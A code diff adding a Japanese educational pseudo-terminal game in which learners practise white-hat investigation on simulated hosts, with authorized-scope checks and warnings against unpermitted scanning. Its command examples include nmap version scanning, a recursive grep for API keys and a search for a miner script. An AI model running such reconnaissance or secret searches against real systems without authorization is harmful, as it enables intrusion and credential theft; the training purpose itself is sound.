+  { cmd: "grep", desc: "文字を含む行を探す", ex: "grep 401 access.log / grep -i / grep -r API_KEY ." },
+  { cmd: "wc -l", desc: "行数を数える", ex: "grep 401 access.log | wc -l" },
+  { cmd: "sort / uniq -c", desc: "並べ替え / 重複を数える", ex: "grep Failed auth.log | sort | uniq -c" },
+  { cmd: "find", desc: "ファイルを探す", ex: "find . -name \"*.js\" / find / -name miner.sh" },
+  { cmd: "|（パイプ）", desc: "前の結果を次のコマンドに渡す", ex: "grep 203.0.113.77 access.log | grep 401" },
+  { cmd: "ping", desc: "相手が動いているか確認", ex: "ping 192.168.10.5" },
+  { cmd: "nmap", desc: "開いているポートを調べる", ex: "nmap 192.168.10.5 / nmap -sV（バージョンも）" },
+  { cmd: "curl", desc: "Webページを取得", ex: "curl http://192.168.10.5/robots.txt" },
+  { cmd: "git", desc: "変更履歴を調べる", ex: "git log / git show 9c4e2a1" },
+  { cmd: "submit", desc: "見つけた答えを報告", ex: "submit 203.0.113.77" },
+  { cmd: "hint", desc: "今の目標のヒントを見る", ex: "hint" },
+  { cmd: "man", desc: "コマンドの説明を見る", ex: "man grep" },
+  { cmd: "clear", desc: "画面をきれいにする", ex: "clear（↑↓キーで過去のコマンド、Tabキーで補完）" },
+];
+</script>
+<script>
+/* =========================================================
+   ターミナル演習（疑似ターミナル）
+   すべてブラウザの中のシミュレーション。本物のコマンドは実行されない。
+   ========================================================= */
+const TERM = { m: null, idx: 0, cwd: HOME, goal: 0, hints: 0, hist: [], histPos: 0, st: {}, done: false };
+
+function termSave() {
+  if (!save.terminal) save.terminal = {};
+  return save.terminal;
+}
+
+/* ---------------- 仮想ファイルシステム ---------------- */
+function normPath(p, cwd) {
+  if (!p) return cwd;
+  if (p === "~" || p.startsWith("~/")) p = HOME + p.slice(1);
+  const parts = (p.startsWith("/") ? p : cwd + "/" + p).split("/");
+  const out = [];
+  parts.forEach(x => {
+    if (!x || x === ".") return;
+    if (x === "..") out.pop(); else out.push(x);
+  });
+  return "/" + out.join("/");
+}
+function getNode(path) {
+  let n = TERM.m.fs;
+  for (const part of path.split("/").filter(Boolean)) {
+    if (n === null || typeof n !== "object" || !(part in n)) return undefined;
+    n = n[part];
+  }
+  return n;
+}
+const isDir = (n) => n !== null && typeof n === "object";
+const baseName = (p) => p.split("/").filter(Boolean).pop() || "/";
+function walk(path, fn) {
+  const n = getNode(path);
+  fn(path, n);
+  if (isDir(n)) Object.keys(n).sort().forEach(k => walk((path === "/" ? "" : path) + "/" + k, fn));
+}
+function globToRe(g) {
+  return new RegExp("^" + g.replace(/[.+^${}()|[\]\\]/g, "\\$&").replace(/\*/g, ".*").replace(/\?/g, ".") + "$");
+}
+function shortPath(p) {
+  if (p === HOME) return "~";
+  if (p.startsWith(HOME + "/")) return "~" + p.slice(HOME.length);
+  return p;
+}
+
+/* ---------------- 字句解析（クォート・| ・&& ・; に対応） ---------------- */
+function tokenize(line) {
+  const toks = [];
+  let cur = "", q = null, has = false;
+  const push = () => { if (has) toks.push({ t: "w", v: cur }); cur = ""; has = false; };
+  for (let i = 0; i < line.length; i++) {
+    const ch = line[i];
+    if (q) { if (ch === q) q = null; else cur += ch; continue; }
+    if (ch === '"' || ch === "'") { q = ch; has = true; continue; }
+    if (/\s/.test(ch)) { push(); continue; }
+    if (ch === "|" ) { push(); toks.push({ t: "op", v: "|" }); continue; }
+    if (ch === ";") { push(); toks.push({ t: "op", v: ";" }); continue; }
+    if (ch === "&" && line[i + 1] === "&") { push(); toks.push({ t: "op", v: "&&" }); i++; continue; }
+    cur += ch; has = true;
+  }
+  push();
+  return toks;
+}
+
+/* ---------------- 出力 ---------------- */
+function termPrint(text, cls) {
+  const out = $("term-out");
+  String(text).split("\n").forEach(line => {
+    out.appendChild(el("div", line === "" ? " " : line, cls ? "tl " + cls : "tl"));
+  });
+  out.scrollTop = out.scrollHeight;
+}
+function promptText() {
+  return `whitehat@${TERM.m.host}:${shortPath(TERM.cwd)}$ `;
+}
+
+/* ---------------- コマンド ---------------- */
+function splitOpts(args) {
+  const flags = new Set(), rest = [];
+  args.forEach(a => {
+    if (/^-[a-zA-Z]+$/.test(a)) a.slice(1).split("").forEach(f => flags.add(f));
+    else rest.push(a);
+  });
+  return { flags, rest };
+}
+function readFiles(files, stdin, cmdName) {
+  if (!files.length) return { text: stdin || "", err: stdin === null ? `${cmdName}: ファイル名を指定してください` : "" };
+  const texts = [], errs = [];
+  files.forEach(f => {
+    const n = getNode(normPath(f, TERM.cwd));
+    if (n === undefined) errs.push(`${cmdName}: ${f}: そのようなファイルやディレクトリはありません`);
+    else if (isDir(n)) errs.push(`${cmdName}: ${f}: ディレクトリです`);
+    else texts.push(n);
+  });
+  return { text: texts.join("\n"), err: errs.join("\n") };
+}
+function lineCount(n) { return n === undefined ? 10 : n; }
+function parseN(args) {
+  let n, files = [];
+  for (let i = 0; i < args.length; i++) {
+    if (args[i] === "-n") { n = parseInt(args[++i], 10); }
+    else if (/^-\d+$/.test(args[i])) n = parseInt(args[i].slice(1), 10);
+    else files.push(args[i]);
+  }
+  return { n: lineCount(n), files };
+}
+
+const MAN = {
+  ls: "ls [-a] [-l] [フォルダ]\n  フォルダの中身を表示する。-a で隠しファイルも、-l で詳しく表示。",
+  cd: "cd [フォルダ]\n  フォルダを移動する。cd .. で1つ上、cd だけでホームへ。",
+  pwd: "pwd\n  今いる場所（フォルダ）を表示する。",
+  cat: "cat ファイル\n  ファイルの中身を表示する。",
+  head: "head [-n 行数] ファイル\n  ファイルの最初の部分（初期値10行）を表示する。",
+  tail: "tail [-n 行数] ファイル\n  ファイルの最後の部分（初期値10行）を表示する。",
+  grep: "grep [-i] [-n] [-c] [-v] [-r] 文字 [ファイル]\n  文字を含む行を表示する。\n  -i 大文字小文字を区別しない / -n 行番号 / -c 件数 / -v 含まない行 / -r フォルダ内を全部検索",
+  wc: "wc [-l] [ファイル]\n  行数などを数える。-l で行数だけ。",
+  sort: "sort [-r] [-n]\n  行を並べ替える。-r で逆順、-n で数字として並べる。",
+  uniq: "uniq [-c]\n  となり合った同じ行をまとめる。-c で回数も表示。sort と組み合わせて使う。",
+  find: "find [場所] -name 名前\n  ファイルを探す。名前には * （何でも）が使える。",
+  ping: "ping ホスト\n  相手のコンピューターが応答するか確認する。",
+  nmap: "nmap [-sV] ホスト\n  開いているポートを調べる（ポートスキャン）。-sV でバージョンも表示。\n  ※ 許可なく他人のコンピューターに使ってはいけない。",
+  curl: "curl URL\n  Webページなどを取得して表示する。",
+  git: "git log / git show コミット番号\n  Gitの変更履歴を表示する。",
+  submit: "submit 答え\n  見つけた答えを報告する。",
+  hint: "hint\n  今の目標のヒントを表示する（使った回数は記録される）。",
+  echo: "echo 文字\n  文字をそのまま表示する。",
+  whoami: "whoami\n  今のユーザー名を表示する。",
+  clear: "clear\n  画面をきれいにする。",
+  history: "history\n  これまでに入力したコマンドを表示する。",
+};
+
+function runCmd(cmd, args, stdin) {
+  const m = TERM.m;
+  const { flags, rest } = splitOpts(args);
+  const ctx = { cmd, args, flags, paths: rest.map(a => normPath(a, TERM.cwd)), cwd: TERM.cwd, target: null };
+  let out = "", err = "";
+
+  switch (cmd) {
+    case "help": {
+      out = "使えるコマンド：\n" + COMMAND_HELP.map(h => `  ${h.cmd.padEnd(14)} ${h.desc}`).join("\n") + "\n\nくわしくは「man コマンド名」。↑↓キーで過去のコマンド、Tabキーでファイル名を補完。";
+      break;
+    }
+    case "man": out = MAN[args[0]] || (args[0] ? `${args[0]} の説明はありません` : "使い方: man コマンド名"); break;
+    case "pwd": out = TERM.cwd; break;
+    case "whoami": out = "whitehat"; break;
+    case "hostname": out = m.host; break;
+    case "echo": out = args.join(" "); break;
+    case "date": out = new Date().toLocaleString("ja-JP"); break;
+    case "history": out = TERM.hist.map((h, i) => `  ${String(i + 1).padStart(3)}  ${h}`).join("\n"); break;
+    case "clear": $("term-out").innerHTML = ""; break;
+    case "ls": {
+      const p = ctx.paths[0] || TERM.cwd;
+      ctx.target = p;
+      const n = getNode(p);
+      if (n === undefined) { err = `ls: ${rest[0]}: そのようなファイルやディレクトリはありません`; break; }
+      if (!isDir(n)) { out = rest[0]; break; }
+      let names = Object.keys(n).sort();
+      if (!flags.has("a")) names = names.filter(x => !x.startsWith("."));
+      else names = [".", ".."].concat(names);
+      if (flags.has("l")) {
+        out = names.map(x => {
+          const c = x === "." || x === ".." ? {} : n[x];
+          const d = isDir(c);
+          const size = d ? 4096 : new Blob([c]).size;
+          return `${d ? "drwxr-xr-x" : "-rw-r--r--"} 1 whitehat whitehat ${String(size).padStart(6)} Nov  6 09:00 ${x}${d && x !== "." && x !== ".." ? "/" : ""}`;
+        }).join("\n");
+      } else {
+        out = names.map(x => (x !== "." && x !== ".." && isDir(n[x])) ? x + "/" : x).join("  ");
+      }
+      break;
+    }
+    case "cd": {
+      const p = ctx.paths[0] || HOME;
+      const n = getNode(p);
+      if (n === undefined) err = `cd: ${rest[0]}: そのようなファイルやディレクトリはありません`;
+      else if (!isDir(n)) err = `cd: ${rest[0]}: ディレクトリではありません`;
+      else TERM.cwd = p;
+      ctx.target = TERM.cwd;
+      break;
+    }
+    case "cat": {
+      const r = readFiles(rest, stdin, "cat");
+      out = r.text; err = r.err;
+      break;
+    }
+    case "head": case "tail": {
+      const { n, files } = parseN(args);
+      ctx.paths = files.map(a => normPath(a, TERM.cwd));
+      const r = readFiles(files, stdin, cmd);
+      const lines = r.text.split("\n");
+      out = (cmd === "head" ? lines.slice(0, n) : lines.slice(-n)).join("\n");
+      err = r.err;
+      break;
+    }
+    case "grep": {
+      if (!rest.length) { err = "使い方: grep [-i -n -c -v -r] 文字 [ファイル]"; break; }
+      const pat = rest[0];
+      const files = rest.slice(1);
+      const test = (line) => {
+        const hit = flags.has("i") ? line.toLowerCase().includes(pat.toLowerCase()) : line.includes(pat);
+        return flags.has("v") ? !hit : hit;
+      };
+      const results = [];
+      const scan = (text, label) => {
+        const lines = text.split("\n");
+        let count = 0;
+        lines.forEach((line, i) => {
+          if (!test(line)) return;
+          count++;
+          if (!flags.has("c")) results.push((label ? label + ":" : "") + (flags.has("n") ? (i + 1) + ":" : "") + line);
+        });
+        if (flags.has("c")) results.push((label ? label + ":" : "") + count);
+      };
+      if (flags.has("r")) {
+        const roots = files.length ? files : ["."];
+        roots.forEach(f => {
+          const root = normPath(f, TERM.cwd);
+          if (getNode(root) === undefined) { err = `grep: ${f}: そのようなファイルやディレクトリはありません`; return; }
+          walk(root, (p, n) => {
+            if (isDir(n)) return;
+            const rel = f === "." ? "." + p.slice(TERM.cwd === "/" ? 0 : TERM.cwd.length) : (f.replace(/\/$/, "") + p.slice(root.length));
+            scan(n, rel);
+          });
+        });
+      } else if (files.length) {
+        files.forEach(f => {
+          const n = getNode(normPath(f, TERM.cwd));
+          if (n === undefined) err = `grep: ${f}: そのようなファイルやディレクトリはありません`;
+          else if (isDir(n)) err = `grep: ${f}: ディレクトリです（フォルダの中を探すなら -r を付けよう）`;
+          else scan(n, files.length > 1 ? f : "");
+        });
+      } else if (stdin !== null) {
+        scan(stdin, "");
+      } else {
+        err = "grep: 探すファイルを指定してください（例：grep 401 access.log）";
+      }
+      out = results.join("\n");
+      break;
+    }
+    case "wc": {
+      const r = readFiles(rest, stdin, "wc");
+      err = r.err;
+      const text = r.text;
+      const lines = text === "" ? 0 : text.split("\n").length;
+      out = flags.has("l") ? String(lines) : `${lines} ${text.split(/\s+/).filter(Boolean).length} ${text.length}`;
+      break;
+    }
+    case "sort": {
+      const r = readFiles(rest, stdin, "sort");
+      err = r.err;
+      let lines = r.text.split("\n");
+      lines.sort(flags.has("n") ? (a, b) => parseFloat(a) - parseFloat(b) : undefined);
+      if (flags.has("r")) lines.reverse();
+      out = lines.join("\n");
+      break;
+    }
+    case "uniq": {
+      const r = readFiles(rest, stdin, "uniq");
+      err = r.err;
+      const res = [];
+      r.text.split("\n").forEach(line => {
+        const last = res[res.length - 1];
+        if (last && last.line === line) last.n++; else res.push({ line, n: 1 });
+      });
+      out = res.map(x => flags.has("c") ? `${String(x.n).padStart(7)} ${x.line}` : x.line).join("\n");
+      break;
+    }
+    case "find": {
+      let start = ".", name = null, type = null;
+      for (let i = 0; i < args.length; i++) {
+        if (args[i] === "-name") name = args[++i];
+        else if (args[i] === "-type") type = args[++i];
+        else if (!args[i].startsWith("-") && i === 0) start = args[i];
+      }
+      const root = normPath(start, TERM.cwd);
+      if (getNode(root) === undefined) { err = `find: '${start}': そのようなファイルやディレクトリはありません`; break; }
+      const re = name ? globToRe(name) : null;
+      const res = [];
+      walk(root, (p, n) => {
+        if (re && !re.test(baseName(p))) return;
+        if (type === "f" && isDir(n)) return;
+        if (type === "d" && !isDir(n)) return;
+        const shown = start === "/" ? p : start.replace(/\/$/, "") + p.slice(root.length);
+        res.push(shown || start);
+      });
+      out = res.join("\n");
+      break;
+    }
+    case "ping": case "nmap": case "curl": {
+      const hostArg = rest.find(a => /\d+\.\d+\.\d+\.\d+/.test(a) || a.includes("://") || /[a-z]\.[a-z]/i.test(a));
+      if (!hostArg) { err = `使い方: ${MAN[cmd].split("\n")[0]}`; break; }
+      const ip = (hostArg.match(/\d+\.\d+\.\d+\.\d+/) || [hostArg.replace(/^https?:\/\//, "").split("/")[0]])[0];
+      if (!m.net) { err = `${cmd}: このミッションでは外部のコンピューターは調べません`; break; }
+      if (!(m.scope || []).includes(ip)) {
+        err = `⚠ ${ip} は診断の許可をもらっていない相手です。\n  ホワイトハッカーは、許可された範囲（${(m.scope || []).join(", ")}）だけを調べます。`;
+        break;
+      }
+      const host = m.net[ip];
+      if (cmd === "ping") {
+        out = `PING ${ip} 56(84) bytes of data.\n` + [12, 9, 11, 10].map((t, i) => `64 bytes from ${ip}: icmp_seq=${i + 1} ttl=64 time=${t}.${i}ms`).join("\n") + `\n--- ${ip} ping statistics ---\n4 packets transmitted, 4 received, 0% packet loss`;
+      } else if (cmd === "nmap") {
+        const v = flags.has("V") || args.includes("-sV");
+        out = `Starting Nmap ( シミュレーション ) at 2026-11-06\nNmap scan report for ${host.name} (${ip})\nHost is up (0.010s latency).\nPORT      STATE SERVICE${v ? "   VERSION" : ""}\n` +
+          host.ports.map(p => `${(p.port + "/tcp").padEnd(9)} open  ${p.service.padEnd(8)}${v ? " " + p.version : ""}`).join("\n") +
+          `\n\nNmap done: 1 IP address (1 host up) scanned`;
+      } else {
+        let path = "/";
+        const mm = hostArg.match(/^(?:https?:\/\/)?[^/]+(\/.*)?$/);
+        if (mm && mm[1]) path = mm[1];
+        const page = host.web[path] !== undefined ? host.web[path] : host.web[path + "/"];
+        out = page !== undefined ? page : "<h1>404 Not Found</h1>";
+      }
+      break;
+    }
+    case "git": {
+      const g = m.git;
+      if (!g || !(TERM.cwd === g.root || TERM.cwd.startsWith(g.root + "/"))) { err = "fatal: not a git repository（Gitで管理されたフォルダの中で使おう）"; break; }
+      if (args[0] === "log") {
+        out = args.includes("--oneline")
+          ? g.log.map(c => `${c.hash} ${c.msg}`).join("\n")
+          : g.log.map(c => `commit ${c.hash}\nAuthor: dev <dev@club-app.example>\nDate:   ${c.date}\n\n    ${c.msg}\n`).join("\n");
+      } else if (args[0] === "show") {
+        const h = args[1];
+        const key = h && Object.keys(g.show).find(k => k.startsWith(h) && h.length >= 4);
+        if (!h) err = "使い方: git show コミット番号";
+        else if (!key) err = `fatal: bad object ${h}`;
+        else out = `commit ${key}\n\n` + g.show[key];
+      } else if (args[0] === "status") {
+        out = "On branch main\nnothing to commit, working tree clean";
+      } else {
+        err = "このシミュレーターで使える git コマンド： git log / git log --oneline / git show コミット番号 / git status";
+      }
+      break;
+    }
+    case "rm": {
+      err = "⚠ このシミュレーターではファイルを消せません。\n  インシデント対応中は、怪しいファイルも「証拠」なのですぐに消してはいけません。";
+      break;
+    }
+    case "sudo": err = "⚠ sudo（管理者権限での実行）はこのシミュレーターでは使えません。"; break;
+    case "ssh": case "telnet": case "wget": case "chmod": case "mkdir": case "touch": case "vi": case "vim": case "nano":
+      err = `${cmd}: このシミュレーターでは使えないコマンドです（help で使えるコマンドを確認）`; break;
+    default:
+      if (m.custom && m.custom[cmd]) out = m.custom[cmd](args, TERM.st);
+      else err = `${cmd}: コマンドが見つかりません（help で使えるコマンドを確認）`;
+  }
+  return { out, err, ctx };
+}
+
+/* ---------------- 実行 ---------------- */
+function execLine(line) {
+  termPrint(promptText() + line, "cmdline");
+  const trimmed = line.trim();
+  if (!trimmed) return;
+  TERM.hist.push(trimmed);
+  TERM.histPos = TERM.hist.length;
+
+  const toks = tokenize(trimmed);
+  if (!toks.length) return;
+  const first = toks[0];
+  if (first.t === "w" && first.v === "submit") { submitAnswer(toks.slice(1).map(t => t.v).join(" ")); return; }
+  if (first.t === "w" && first.v === "hint") { showTermHint(); return; }
+  if (first.t === "w" && first.v === "exit") { termPrint("ログアウトします…"); setTimeout(openTermSelect, 400); return; }
+
+  // ; と && で区切った各コマンド列（パイプライン）を順に実行
+  const lists = [];
+  let cur = [[]], sep = null;
+  toks.forEach(t => {
+    if (t.t === "op" && t.v === "|") cur.push([]);
+    else if (t.t === "op") { lists.push({ pipe: cur, sep }); cur = [[]]; sep = t.v; }
+    else cur[cur.length - 1].push(t.v);
+  });
+  lists.push({ pipe: cur, sep });
+
+  let lastOk = true;
+  for (const { pipe, sep: s } of lists) {
+    if (s === "&&" && !lastOk) break;
+    let stdin = null, ok = true;
+    const ctxs = [];
+    for (let i = 0; i < pipe.length; i++) {
+      const words = pipe[i];
+      if (!words.length) { termPrint("構文エラー：| の前後にコマンドがありません", "err"); ok = false; break; }
+      const r = runCmd(words[0], words.slice(1), stdin);
+      if (r.err) { termPrint(r.err, "err"); ok = false; }
+      ctxs.push(r.ctx);
+      if (i === pipe.length - 1) { if (r.out !== "") termPrint(r.out); }
+      else stdin = r.out;
+    }
+    // 結果を表示してから、目標を達成したかを判定する
+    ctxs.forEach(checkCmdGoal);
+    lastOk = ok;
+  }
+  renderTermGoals();
+}
+
+/* ---------------- 目標 ---------------- */
+const normAns = (s) => String(s).trim().replace(/^["'「]|["'」]$/g, "").trim().toLowerCase();
+
+function completeGoal() {
+  const g = TERM.m.goals[TERM.goal];
+  SFX.good();
+  termPrint(`✔ 目標${TERM.goal + 1} 達成！ ${g.explain}`, "ok");
+  TERM.goal++;
+  if (TERM.goal >= TERM.m.goals.length) finishTerm();
+  else termPrint(`▶ 次の目標：${TERM.m.goals[TERM.goal].text}`, "goal");
+}
+function checkCmdGoal(ctx) {
+  if (TERM.done) return;
+  // 1つのコマンドで続けて達成できる目標はまとめて達成
+  while (!TERM.done) {
+    const g = TERM.m.goals[TERM.goal];
+    if (g.type !== "cmd") return;
+    let ok = false;
+    try { ok = g.test(ctx); } catch (e) { ok = false; }
+    if (!ok) return;
+    completeGoal();
+  }
+}
+function submitAnswer(ans) {
+  if (TERM.done) { termPrint("このミッションはクリア済みです。"); return; }
+  if (!ans) { termPrint("使い方: submit 答え（例：submit 203.0.113.77）", "err"); return; }
+  const g = TERM.m.goals[TERM.goal];
+  if (g.type !== "answer") { termPrint("今の目標は、コマンドを実行することです（hint でヒント）。", "err"); return; }
+  if (g.answers.some(a => normAns(a) === normAns(ans))) completeGoal();
+  else { SFX.bad(); termPrint(`✘ 「${ans}」はちがうようです。もう一度調べてみよう（hint でヒント）。`, "err"); }
+  renderTermGoals();
+}
+function showTermHint() {
+  if (TERM.done) return;
+  TERM.hints++;
+  termPrint("💡 ヒント：" + TERM.m.goals[TERM.goal].hint, "hint");
+  renderTermGoals();
+}
+
+function renderTermGoals() {
+  const box = $("term-goals");
+  box.innerHTML = "";
+  TERM.m.goals.forEach((g, i) => {
+    const state = i < TERM.goal ? "done" : i === TERM.goal && !TERM.done ? "now" : "todo";
+    const li = el("li", null, state);
+    li.textContent = (state === "done" ? "✔ " : state === "now" ? "▶ " : "・ ") + (i <= TERM.goal || TERM.done ? g.text : "？？？（前の目標をクリアすると表示）");
+    box.appendChild(li);
+  });
+  $("term-progress").textContent = `${Math.min(TERM.goal, TERM.m.goals.length)} / ${TERM.m.goals.length}　ヒント使用 ${TERM.hints}回`;
+}
+
+function finishTerm() {
+  TERM.done = true;
+  const stars = TERM.hints === 0 ? 3 : TERM.hints <= 2 ? 2 : 1;
+  const ts = termSave();
+  const prev = ts[TERM.m.id];
+  ts[TERM.m.id] = { cleared: true, stars: Math.max(stars, prev ? prev.stars : 0) };
+  persist();
+  SFX.fanfare();
+  termPrint("", "");
+  termPrint(`★ MISSION COMPLETE ★　評価：${"★".repeat(stars)}${"☆".repeat(3 - stars)}`, "ok");
+  termPrint(TERM.m.summary, "goal");
+  unlock("term_first");
+  if (TERM.hints === 0) unlock("term_nohint");
+  if (TERMINAL_MISSIONS.every(x => ts[x.id] && ts[x.id].cleared)) unlock("term_all");
+  const c = $("term-clear");
+  c.style.display = "";
+  $("term-clear-stars").textContent = "★".repeat(stars) + "☆".repeat(3 - stars);
+  $("term-clear-text").textContent = TERM.m.summary;
+  const next = TERMINAL_MISSIONS[TERM.idx + 1];
+  $("btn-term-next").style.display = next ? "" : "none";
+  renderTermGoals();
+}
+
+/* ---------------- 画面 ---------------- */
+function openTermSelect() {
+  const list = $("term-list");
+  list.innerHTML = "";
+  const ts = termSave();
+  TERMINAL_MISSIONS.forEach((m, i) => {
+    const s = ts[m.id];
+    const b = el("button");
+    b.append(
+      el("b", `${i + 1}. ${m.title}`),
+      el("small", `【${m.level}】 学べるコマンド：${m.learn}`),
+      el("small", s && s.cleared ? `クリア済み ${"★".repeat(s.stars)}${"☆".repeat(3 - s.stars)}` : "未クリア")
+    );
+    b.addEventListener("click", () => startTerm(i));
+    list.appendChild(b);
+  });
+  const cl = $("cmd-list");
+  if (!cl.childElementCount) {
+    COMMAND_HELP.forEach(h => {
+      const d = el("div", null, "cmd-item");
+      d.append(el("b", h.cmd), el("span", h.desc), el("code", h.ex));
+      cl.appendChild(d);
+    });
+  }
+  show("s-term-select");
+}
+
+function startTerm(i) {
+  stopTimer();
+  TERM.idx = i;
+  TERM.m = TERMINAL_MISSIONS[i];
+  TERM.cwd = HOME;
+  TERM.goal = 0;
+  TERM.hints = 0;
+  TERM.hist = [];
+  TERM.histPos = 0;
+  TERM.st = {};
+  TERM.done = false;
+  $("term-title").textContent = `TERMINAL ${i + 1}：${TERM.m.title}`;
+  $("term-story").textContent = TERM.m.story;
+  $("term-clear").style.display = "none";
+  $("term-out").innerHTML = "";
+  const chips = $("term-chips");
+  chips.innerHTML = "";
+  TERM.m.chips.forEach(c => {
+    const b = el("button", c.trim());
+    b.addEventListener("click", () => {
+      const inp = $("term-input");
+      const v = inp.value;
+      inp.value = c.startsWith("|") ? v.replace(/\s*$/, " ") + c + " " : (v && !v.endsWith(" ") ? v + " " : v) + c;
+      inp.focus();
+    });
+    chips.appendChild(b);
+  });
+  termPrint("========================================================", "dim");
+  termPrint(` ${TERM.m.host} に接続しました（シミュレーション）`, "dim");
+  termPrint(" 本物のコンピューターには一切つながっていません。", "dim");
+  termPrint(" help でコマンド一覧、hint でヒントを表示できます。", "dim");
+  termPrint("========================================================", "dim");
+  termPrint(`▶ 目標：${TERM.m.goals[0].text}`, "goal");
+  renderTermGoals();
+  updatePrompt();
+  show("s-term");
+  setTimeout(() => $("term-input").focus(), 50);
+}
+
+function updatePrompt() {
+  $("term-prompt").textContent = promptText();
+}
+
+/* Tab補完：最後の単語を、フォルダの中のファイル名で補う */
+function complete() {
+  const inp = $("term-input");
+  const v = inp.value;
+  const m = v.match(/(\S*)$/);
+  const word = m ? m[1] : "";
+  const slash = word.lastIndexOf("/");
+  const dirPart = slash >= 0 ? word.slice(0, slash + 1) : "";
+  const prefix = slash >= 0 ? word.slice(slash + 1) : word;
+  const dir = getNode(normPath(dirPart || ".", TERM.cwd));
+  if (!isDir(dir)) return;
+  const cands = Object.keys(dir).filter(k => k.startsWith(prefix) && (prefix.startsWith(".") || !k.startsWith(".")));
+  if (cands.length === 1) {
+    const k = cands[0];
+    inp.value = v.slice(0, v.length - word.length) + dirPart + k + (isDir(dir[k]) ? "/" : " ");
+  } else if (cands.length > 1) {
+    termPrint(promptText() + v, "cmdline");
+    termPrint(cands.map(k => isDir(dir[k]) ? k + "/" : k).join("  "));
+  }
+}
+
+$("term-form").addEventListener("submit", (e) => {
+  e.preventDefault();
+  const inp = $("term-input");
+  const line = inp.value;
+  inp.value = "";
+  execLine(line);
+  updatePrompt();
+});
+$("term-input").addEventListener("keydown", (e) => {
+  if (e.key === "Tab") { e.preventDefault(); complete(); }
+  else if (e.key === "ArrowUp") {
+    e.preventDefault();
+    if (TERM.histPos > 0) { TERM.histPos--; e.target.value = TERM.hist[TERM.histPos]; }
+  } else if (e.key === "ArrowDown") {
+    e.preventDefault();
+    if (TERM.histPos < TERM.hist.length - 1) { TERM.histPos++; e.target.value = TERM.hist[TERM.histPos]; }
+    else { TERM.histPos = TERM.hist.length; e.target.value = ""; }
+  } else if (e.key === "l" && e.ctrlKey) { e.preventDefault(); $("term-out").innerHTML = ""; }
+});
+$("term-out").addEventListener("click", () => { if (!window.getSelection().toString()) $("term-input").focus(); });
+$("btn-terminal").addEventListener("click", openTermSelect);
+$("btn-term-back").addEventListener("click", openTermSelect);
+$("btn-term-hint").addEventListener("click", () => { execLine("hint"); updatePrompt(); });
+$("btn-term-next").addEventListener("click", () => startTerm(TERM.idx + 1));
+$("btn-term-list").addEventListener("click", openTermSelect);
 </script>
 </body>
 </html>
